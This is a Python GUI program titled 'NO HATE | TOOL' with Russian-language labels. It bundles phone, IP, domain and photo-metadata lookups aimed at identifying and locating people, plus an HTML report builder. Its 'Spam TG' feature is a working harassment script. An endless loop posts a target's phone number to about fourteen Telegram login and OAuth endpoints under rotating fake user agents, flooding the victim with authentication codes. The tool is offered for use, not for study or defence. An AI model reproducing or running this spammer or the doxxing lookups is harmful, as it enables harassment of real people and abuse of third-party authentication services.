import customtkinter
from PIL import Image
from PIL.ExifTags import TAGS
from bs4 import BeautifulSoup
from socket import gethostbyname
import fake_useragent
import webbrowser
import threading
import requests
import random
import string
import random
import time
import json
import os

user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36'}
base_phone = {}
base_ip = {}
base_site = {}
base_photo = {}

#function's
def search_phone(phone: str):
    url = f"https://fincalculator.ru/api/tel/{phone}"
    response = requests.get(url, headers={'User-Agent': user_agent})
    data = json.loads(response.text)
    
    base = {
        "Query": phone,
        "Country": data["country"] if data["country"] != "" else "Не найдено",
        "Region": data["region"] if data["region"] != "" else "Не найдено",
        "Oper": data["operator"] if data["operator"] != "" else "Не найдено"
    }
    
    global base_phone
    base_phone = base
    
    return base

def search_ip(ip: str):
    url = f"https://ipinfo.io/{ip}/json"
    response = requests.get(url, headers={'User-Agent': user_agent})
    data = response.json()
    
    base = {
        "Query": ip,
        "Country": data.get('country', "Не найдено"),
        "Region": data.get('region', "Не найдено"),
        "City": data.get('city', "Не найдено"),
        "Org": data.get('org', "Не найдено"),
    }
    
    global base_ip
    base_ip = base
    
    return base

def info_site(domen: str):
    ip = gethostbyname(domen.split('/')[2]) if '/' in domen else gethostbyname(domen)
    
    base = {
        "Query": domen,
        "IP": ip
    }
    
    global base_site
    base_site = base
    
    return base

def info_photo(path: str, tags_to_retrieve=['Make', 'DateTime']):
    image = Image.open(path)
    exifdata = image.getexif()
    
    dataMAKE = "None"
    dataDT = "None"

    metadata = {}
    for tag_id, value in exifdata.items():
        tag = TAGS.get(tag_id, tag_id)
        if tags_to_retrieve is None or tag in tags_to_retrieve:
            if isinstance(value, bytes):
                value = value.decode()
            metadata[tag] = value
    
    for tag, value in metadata.items():
        if tag == "Make":
            dataMAKE = value
        
        if tag == "DateTime":
            dataDT = value

    base = {
        "Query": path,
        "Device": dataMAKE,
        "Date-Time": dataDT
    }
    
    global base_photo
    base_photo = base
    
    return base

def spam_tg(phone: str):
    urls = [
        'https://translations.telegram.org/auth/request',
        'https://my.telegram.org/auth/send_password',
        'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
        'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
        'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
        'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
        'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
        'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%%2Fbot-t.com%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
        'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=5082101769&origin=https%3A%2F%2Fauth.smartbotpro.ru&request_access=write&lang=ru&return_to=https%3A%2F%2Fauth.smartbotpro.ru%2Fauth%2Flogin%2F',
        'https://oauth.telegram.org/auth/request?bot_id=366357143&origin=https%3A%2F%2Fwww.botobot.ru&embed=1&request_access=write&lang=ru&return_to=https%3A%2F%2Fwww.botobot.ru%2Fblog%2Fru%2Fvoiti-cherez-telegram-avtorizatsiia-na-saitie-botobot%2F'
    ]
    
    while True:
        for url in urls:
            user = fake_useragent.UserAgent().random
            headers = {'user-agent': user}
        
            requests.post(url, headers=headers, data={'phone': phone})
            time.sleep(0.5)



#Menu
def phone():
    phone = customtkinter.CTk()
    phone.geometry("340x350")
    phone.title("NO HATE | INFO BY PHONE")
    
    def clear():
        global base_phone
        base_phone = None
        phone.destroy()

    phone.protocol("WM_DELETE_WINDOW", clear)
    
    entry = customtkinter.CTkEntry(master=phone, placeholder_text="+7XXXXXXXXXX")
    entry.place(x=170, y=230, anchor=customtkinter.CENTER)
    
    textbox = customtkinter.CTkTextbox(master=phone, width=350, corner_radius=0)
    textbox.place(x=175, y=100, anchor=customtkinter.CENTER)
    
    def one():
        textbox.delete(0.0, 'end')
        info = search_phone(entry.get())
        textbox.insert(f"0.0", f'Страна: {info["Country"]} \nРегион: {info["Region"]} \nОператор: {info["Oper"]}')

    button = customtkinter.CTkButton(master=phone, text="Search", command=one)
    button.place(x=170, y=260, anchor=customtkinter.CENTER)
    
    phone.mainloop()



def ip():
    ip = customtkinter.CTk()
    ip.geometry("340x350")
    ip.title("NO HATE | INFO BY IP")
    
    def clear():
        global base_ip
        base_ip = None
        ip.destroy()

    ip.protocol("WM_DELETE_WINDOW", clear)
    
    entry = customtkinter.CTkEntry(master=ip, placeholder_text="IP...")
    entry.place(x=170, y=230, anchor=customtkinter.CENTER)
    
    textbox = customtkinter.CTkTextbox(master=ip, width=350, corner_radius=0)
    textbox.place(x=175, y=100, anchor=customtkinter.CENTER)
    
    def one():
        textbox.delete(0.0, 'end')
        info = search_ip(entry.get())
        textbox.insert(f"0.0", f'Страна: {info["Country"]} \nРегион: {info["Region"]} \nГород: {info["City"]} \nПровайдер: {info["Org"]}')

    button = customtkinter.CTkButton(master=ip, text="Search", command=one)
    button.place(x=170, y=260, anchor=customtkinter.CENTER)
    
    ip.mainloop()

def site():
    site = customtkinter.CTk()
    site.geometry("340x350")
    site.title("NO HATE | INFO BY SITE")
    
    def clear():
        global base_site
        base_site = None
        site.destroy()

    site.protocol("WM_DELETE_WINDOW", clear)
    
    entry = customtkinter.CTkEntry(master=site, placeholder_text="example.com...")
    entry.place(x=170, y=230, anchor=customtkinter.CENTER)
    
    textbox = customtkinter.CTkTextbox(master=site, width=350, corner_radius=0)
    textbox.place(x=175, y=100, anchor=customtkinter.CENTER)
    
    def one():
        textbox.delete(0.0, 'end')
        info = info_site(entry.get())
        textbox.insert(f"0.0", f'IP: {info["IP"]}')

    button = customtkinter.CTkButton(master=site, text="Search", command=one)
    button.place(x=170, y=260, anchor=customtkinter.CENTER)
    
    site.mainloop()
    
def photo():
    photo = customtkinter.CTk()
    photo.geometry("340x350")
    photo.title("NO HATE | INFO BY IP")
    
    def clear():
        global base_ip
        base_ip = None
        photo.destroy()

    photo.protocol("WM_DELETE_WINDOW", clear)
    
    entry = customtkinter.CTkEntry(master=photo, placeholder_text="Photo path...")
    entry.place(x=170, y=230, anchor=customtkinter.CENTER)
    
    textbox = customtkinter.CTkTextbox(master=photo, width=350, corner_radius=0)
    textbox.place(x=175, y=100, anchor=customtkinter.CENTER)
    
    def one():
        textbox.delete(0.0, 'end')
        info = info_photo(entry.get())
        textbox.insert(f"0.0", f'Устройство: {info["Device"]} \nДата и время: {info["Date-Time"]}')

    button = customtkinter.CTkButton(master=photo, text="Get MetaData", command=one)
    button.place(x=170, y=260, anchor=customtkinter.CENTER)
    
    photo.mainloop()

def tg():
    spam = customtkinter.CTk()
    spam.geometry("400x300")
    spam.title("NO HATE | TELEGRAM SPAMMER")
    
    entry = customtkinter.CTkEntry(master=spam, placeholder_text="+7XXXXXXXXXX")
    entry.place(x=200, y=110, anchor=customtkinter.CENTER)
    
    def one():
        spam_tg(entry.get())

    button = customtkinter.CTkButton(master=spam, text="Apply", command=one)
    button.place(x=200, y=140, anchor=customtkinter.CENTER)
    
    spam.mainloop()

def report():
    html = """
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
        <title>NO_HATE | Report</title>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
        
        <svg style="display:none;">
            <symbol id="logo-icon" viewBox="0 0 24 24">
                <path d="M12 0C8.27 0 5.14 2.55 4.25 6c-.07.3-.12.61-.15.93A9.08 9.08 0 0 0 2 12c0 5.52 4.48 10 10 10s10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8 0-1.85.63-3.55 1.69-4.9L16.9 18.3A7.902 7.902 0 0 1 12 20zm6.31-3.1L7.1 5.69A7.902 7.902 0 0 1 12 4c4.41 0 8 3.59 8 8 0 1.85-.63 3.55-1.69 4.9z"/>
            </symbol>
            <symbol id="copy-icon" viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></symbol>
            <symbol id="arrow-up" viewBox="0 0 24 24"><path fill="currentColor" d="M13 20h-2V8.83L8.41 11.4 7 10l5-5 5 5-1.41 1.4L13 8.83V20z"/></symbol>
        </svg>

        <style>
            :root {
                --primary: #6366f1;
                --secondary: #8b5cf6;
                --accent: #ec4899;
                --background: #0f172a;
                --surface: #1e293b;
                --text: #f8fafc;
                --text-secondary: #94a3b8;
            }

            * {
                box-sizing: border-box;
                margin: 0;
                padding: 0;
            }

            body {
                font-family: 'Inter', system-ui, -apple-system, sans-serif;
                background: var(--background);
                color: var(--text);
                line-height: 1.5;
                padding: 1rem;
                min-height: 100vh;
            }

            .container {
                max-width: 1200px;
                margin: 0 auto;
                position: relative;
                padding-bottom: 2rem;
            }

            .corner-logo {
                position: absolute;
                top: 1rem;
                right: 1rem;
                display: flex;
                align-items: center;
                gap: 0.5rem;
                color: var(--text);
                text-decoration: none;
                z-index: 100;
            }

            .logo-icon {
                width: 32px;
                height: 32px;
                fill: currentColor;
                transition: transform 0.2s;
            }

            .logo-text {
                font-weight: 700;
                font-size: 1.25rem;
                background: linear-gradient(45deg, var(--primary), var(--secondary));
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
            }

            .stats-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                gap: 1.5rem;
                margin: 2rem 0;
            }

            .stat-card {
                background: var(--surface);
                padding: 1.5rem;
                border-radius: 1rem;
                border-left: 4px solid var(--primary);
                box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1);
            }

            .leak-card {
                background: var(--surface);
                border-radius: 1rem;
                padding: 1.5rem;
                margin-bottom: 1.5rem;
                border: 1px solid rgba(255,255,255,0.1);
                transition: transform 0.2s;
            }

            .leak-card:hover {
                transform: translateY(-2px);
            }

            .leak-header {
                display: flex;
                align-items: center;
                gap: 1rem;
                margin-bottom: 1.5rem;
            }

            .source-badge {
                background: linear-gradient(45deg, var(--primary), var(--secondary));
                color: white;
                padding: 0.25rem 0.75rem;
                border-radius: 0.5rem;
                font-size: 0.875rem;
                font-weight: 500;
            }

            .data-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
                gap: 1rem;
            }

            .data-item {
                background: rgba(255,255,255,0.05);
                padding: 1rem;
                border-radius: 0.75rem;
                position: relative;
                overflow: hidden;
            }

            .copy-btn {
                display: flex;
                align-items: center;
                gap: 0.5rem;
                background: rgba(255,255,255,0.1);
                border: none;
                color: var(--text);
                padding: 0.5rem 1rem;
                border-radius: 0.5rem;
                cursor: pointer;
                margin-top: 0.75rem;
                transition: all 0.2s;
                width: 100%;
                justify-content: center;
            }

            .copy-btn:hover {
                background: var(--primary);
                box-shadow: 0 2px 8px -1px var(--primary);
            }

            .copy-icon {
                width: 16px;
                height: 16px;
                fill: currentColor;
            }

            .scroll-top {
                position: fixed;
                bottom: -60px;
                right: 20px;
                width: 44px;
                height: 44px;
                background: var(--primary);
                color: white;
                border: none;
                border-radius: 50%;
                cursor: pointer;
                opacity: 0;
                transition: all 0.3s ease;
                display: flex;
                align-items: center;
                justify-content: center;
                box-shadow: 0 4px 12px rgba(99, 102, 241, 0.25);
                z-index: 1000;
            }

            .scroll-top.visible {
                bottom: 20px;
                opacity: 1;
            }

            .scroll-top:hover {
                transform: translateY(-2px) scale(1.05);
                background: var(--secondary);
            }

            @media (max-width: 768px) {
                .container {
                    padding: 0 0.5rem;
                }
                
                .leak-header {
                    flex-wrap: wrap;
                }
                
                .data-grid {
                    grid-template-columns: 1fr;
                }
                
                .corner-logo {
                    position: static;
                    justify-content: center;
                    margin-bottom: 1.5rem;
                }
                
                .scroll-top {
                    right: 10px;
                    bottom: -60px;
                    width: 40px;
                    height: 40px;
                }
                
                .scroll-top.visible {
                    bottom: 70px;
                }
            }

            .fade-in {
                animation: fadeIn 0.3s ease-in;
            }

            @keyframes fadeIn {
                from { opacity: 0; transform: translateY(10px); }
                to { opacity: 1; transform: translateY(0); }
            }
        </style>
    </head>
    <body>
    """
    try:
        html += f"""
        <div class="leak-card fade-in">
            <div class="leak-header">
                <span class="source-badge">INFO BY PHONE  |  Запрос: {base_phone["Query"]}</span>
            </div>
            <div class="data-grid">
        <div class="data-item">
                <div style="margin-bottom: 0.5rem;">
                    <div style="color: var(--text-secondary); font-size: 0.875rem;">
                    🌏Страна
                    </div>
                    <div style="word-break: break-word;">{base_phone["Country"]}</div>
                    
                    <div style="color: var(--text-secondary); font-size: 0.875rem;">
                    🌲Регион
                    </div>
                    <div style="word-break: break-word;">{base_phone["Region"]}</div>
                    
                    <div style="color: var(--text-secondary); font-size: 0.875rem;">
                    👤Оператор
                    </div>
                    <div style="word-break: break-word;">{base_phone["Oper"]}</div>
                    
                    </div>
            </div>
        </div>
        </div></div>"""
    except:
        pass
        
    try:
        html += f"""
        <div class="leak-card fade-in">
            <div class="leak-header">
                <span class="source-badge">INFO BY IP  |  Запрос: {base_ip["Query"]}</span>
            </div>
            <div class="data-grid">
        <div class="data-item">
                <div style="margin-bottom: 0.5rem;">
                    <div style="color: var(--text-secondary); font-size: 0.875rem;">
                    🌏Страна
                    </div>
                    <div style="word-break: break-word;">{base_ip["Country"]}</div>
                    
                    <div style="color: var(--text-secondary); font-size: 0.875rem;">
                    🌲Регион
                    </div>
                    <div style="word-break: break-word;">{base_ip["Region"]}</div>
                    
                    <div style="color: var(--text-secondary); font-size: 0.875rem;">
                    🏘Город
                    </div>
                    <div style="word-break: break-word;">{base_ip["City"]}</div>
                    
                    <div style="color: var(--text-secondary); font-size: 0.875rem;">
                    👤Провайдер
                    </div>
                    <div style="word-break: break-word;">{base_ip["Org"]}</div>
                    
                    </div>
            </div>
        </div>
        </div></div>
        """
    except:
        pass
        
    try:
        html += f"""
        <div class="leak-card fade-in">
        <div class="leak-header">
            <span class="source-badge">INFO BY SITE  |  Запрос: {base_site["Query"]}</span>
        </div>
            <div class="data-grid">
                <div class="data-item">
                <div style="margin-bottom: 0.5rem;">
                    <div style="color: var(--text-secondary); font-size: 0.875rem;">
                    🌐IP
                    </div>
                    <div style="word-break: break-word;">{base_site["IP"]}</div>
                    
                    </div>
            </div>
        </div>
        </div></div>
        """
    except:
        pass
    
    try:
        html += f"""
        <div class="leak-card fade-in">
            <div class="leak-header">
                <span class="source-badge">INFO BY PHOTO  |  Запрос: {base_photo["Query"]}</span>
            </div>
            <div class="data-grid">
        <div class="data-item">
                <div style="margin-bottom: 0.5rem;">
                    <div style="color: var(--text-secondary); font-size: 0.875rem;">
                    📱Устройство
                    </div>
                    <div style="word-break: break-word;">{base_photo["Device"]}</div>
                    
                    <div style="color: var(--text-secondary); font-size: 0.875rem;">
                    🕗Дата и время
                    </div>
                    <div style="word-break: break-word;">{base_photo["Date-Time"]}</div>
                    
                    </div>
            </div>
        </div>
        </div></div>
        """
    except:
        pass
        
    html += """
        <button class="scroll-top" aria-label="Прокрутить вверх">
            <svg style="width:24px;height:24px;"><use href="#arrow-up"/></svg>
        </button>
        <script>
            // Скрипт для кнопки прокрутки
            const scrollBtn = document.querySelector('.scroll-top');
            
            window.addEventListener('scroll', () => {
                if (window.scrollY > 500) {
                    scrollBtn.classList.add('visible');
                } else {
                    scrollBtn.classList.remove('visible');
                }
            });

            scrollBtn.addEventListener('click', () => {
                window.scrollTo({
                    top: 0,
                    behavior: 'smooth'
                });
            });

            // Скрипт для копирования данных
            document.querySelectorAll('.copy-btn').forEach(btn => {
                btn.addEventListener('click', async (e) => {
                    const card = e.target.closest('.data-item');
                    const content = Array.from(card.children)
                        .filter(el => !el.classList.contains('copy-btn'))
                        .map(el => {
                            const label = el.querySelector('div:first-child').innerText;
                            const value = el.querySelector('div:last-child').innerText;
                            return `${label}: ${value}`;
                        })
                        .join('');

                    try {
                        await navigator.clipboard.writeText(content);
                        
                        const originalHTML = btn.innerHTML;
                        btn.innerHTML = `
                            <svg class="copy-icon"><use href="#copy-icon"/></svg>
                            Скопировано!
                        `;
                        
                        setTimeout(() => {
                            btn.innerHTML = originalHTML;
                        }, 2000);
                    } catch (err) {
                        console.error('Ошибка копирования:', err);
                    }
                });
            });

            // Адаптация для мобильных устройств
            function updateVH() {
                document.documentElement.style.setProperty('--vh', window.innerHeight * 0.01 + 'px');
            }
            updateVH();
            window.addEventListener('resize', updateVH);
        </script>
    </body>
    </html>
    """
    with open('report.html', 'w') as file:
        file.write(html)
    
    webbrowser.open('report.html')

customtkinter.set_appearance_mode("dark")  # Modes: "System" (standard), "Dark", "Light"
customtkinter.set_default_color_theme("dark-blue")  # Themes: "blue" (standard), "green", "dark-blue"

app = customtkinter.CTk()
app.geometry("400x360")
app.title("NO HATE | TOOL")

button = customtkinter.CTkButton(master=app, text="Search By Phone", command=phone)
button.place(x=200, y=110, anchor=customtkinter.CENTER)

button = customtkinter.CTkButton(master=app, text="Search By IP", command=ip)
button.place(x=200, y=140, anchor=customtkinter.CENTER)

button = customtkinter.CTkButton(master=app, text="Search by Site", command=site)
button.place(x=200, y=170, anchor=customtkinter.CENTER)

button = customtkinter.CTkButton(master=app, text="INFO by Photo", command=photo)
button.place(x=200, y=200, anchor=customtkinter.CENTER)

button = customtkinter.CTkButton(master=app, text="Spam TG", command=tg)
button.place(x=200, y=230, anchor=customtkinter.CENTER)

button = customtkinter.CTkButton(master=app, text="Create report", command=report)
button.place(x=200, y=260, anchor=customtkinter.CENTER)
app.mainloop()
